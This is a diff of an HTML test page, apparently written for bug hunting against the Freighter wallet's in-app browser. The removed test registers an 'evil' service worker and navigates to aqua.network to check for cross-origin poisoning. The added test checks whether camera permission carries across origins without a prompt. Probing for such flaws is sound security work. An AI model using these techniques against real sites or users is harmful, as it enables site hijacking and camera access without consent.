@@ -2,60 +2,58 @@
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>SW Cross-Origin Poison - Freighter Test</title>
-<style>body{font-family:monospace;padding:15px;background:#111;color:#0f0} button{padding:12px;width:100%;margin:5px 0;background:#0f0;color:#000;font-weight:bold} pre{background:#222;padding:10px;white-space:pre-wrap;word-break:break-all}</style>
+<title>Camera Permission Reuse - Freighter Test</title>
+<style>
+body{font-family:monospace;padding:15px;background:#111;color:#0f0}
+button{padding:14px;width:100%;margin:6px 0;background:#0f0;color:#000;font-weight:bold}
+pre{background:#222;padding:10px;white-space:pre-wrap;word-break:break-all;min-height:100px}
+video{width:100%;max-height:300px;background:#000;margin:10px 0}
+</style>
 </head>
 <body>
-<h2>SW Cross-Origin Poison Test</h2>
+<h2>Camera Permission Reuse Test</h2>
 <p>Origin: <b id=origin></b></p>
 <pre id=log></pre>
+<video id=vid autoplay playsinline muted></video>
 
-<button onclick="registerSW()">1. Register Evil SW from 0x403for</button>
-<button onclick="checkSW()">2. Check SW Registration</button>
-<button onclick="goAqua()">3. Navigate to aqua.network (test poison)</button>
-<button onclick="clearSW()">Clear SW (cleanup)</button>
+<button onclick="checkPermission()">1. Check Camera Permission Status</button>
+<button onclick="requestCamera()">2. Request Camera</button>
+<button onclick="testReuse()">3. TEST REUSE - tanpa prompt = BUG</button>
+<button onclick="stopCamera()">Stop Camera</button>
 
 <script>
-const logEl = document.getElementById('log');
-function log(t){ logEl.textContent += t+'\n'; console.log(t); }
-document.getElementById('origin').textContent = location.origin;
-log('Page loaded: '+location.href);
+const logEl=document.getElementById('log'), vid=document.getElementById('vid');
+function log(t){logEl.textContent+=new Date().toLocaleTimeString()+' '+t+'\n'}
+document.getElementById('origin').textContent=location.origin;
+let stream=null;
 
-async function registerSW(){
-  log('\n--- Registering SW ---');
+async function checkPermission(){
   try{
-    let reg = await navigator.serviceWorker.register('/sw.js', {scope:'/'});
-    log('SW Registered: '+reg.scope);
-    await navigator.serviceWorker.ready;
-    log('SW READY - Active: '+navigator.serviceWorker.controller);
-    log('Now click button 3 to navigate to aqua.network');
-  }catch(e){
-    log('Register ERR: '+e.message);
-    try{
-      let reg2 = await navigator.serviceWorker.register('./sw.js', {scope:'./'});
-      log('Fallback SW Registered: '+reg2.scope);
-    }catch(e2){ log('Fallback ERR: '+e2.message); }
-  }
+    let perm=await navigator.permissions.query({name:'camera'});
+    log('Camera state: '+perm.state);
+  }catch(e){log('Permissions API: '+e.message)}
 }
 
-async function checkSW(){
-  let regs = await navigator.serviceWorker.getRegistrations();
-  log('\n--- SW Registrations: '+regs.length+' ---');
-  regs.forEach(r=>log('Scope: '+r.scope+' | Active: '+!!r.active));
-  log('Controller: '+(navigator.serviceWorker.controller ? navigator.serviceWorker.controller.scriptURL : 'none'));
+async function requestCamera(){
+  log('Requesting Camera...');
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({video:true});
+    log('SUCCESS: Got stream - GRANTED'); vid.srcObject=stream;
+  }catch(e){log('ERR: '+e.name+' - '+e.message)}
 }
 
-function goAqua(){
-  log('\n--- Navigating to aqua.network ---');
-  log('If Single WebView bug, aqua.network will be served by 0x403for SW');
-  location.href = 'https://aqua.network';
+async function testReuse(){
+  log('TEST REUSE from: '+location.origin);
+  let start=Date.now();
+  try{
+    let s2=await navigator.mediaDevices.getUserMedia({video:true});
+    let elapsed=Date.now()-start;
+    log('REUSE SUCCESS in '+elapsed+'ms - NO PROMPT!');
+    if(elapsed<500) log('>>> CRITICAL BUG: Permission reused across origins!');
+    vid.srcObject=s2; stream=s2;
+  }catch(e){log('Blocked (secure): '+e.name)}
 }
-
-async function clearSW(){
-  let regs = await navigator.serviceWorker.getRegistrations();
-  for(let r of regs){ await r.unregister(); }
-  log('All SW unregistered');
-}
+function stopCamera(){if(stream){stream.getTracks().forEach(t=>t.stop())} vid.srcObject=null}
 </script>
 </body>
 </html>
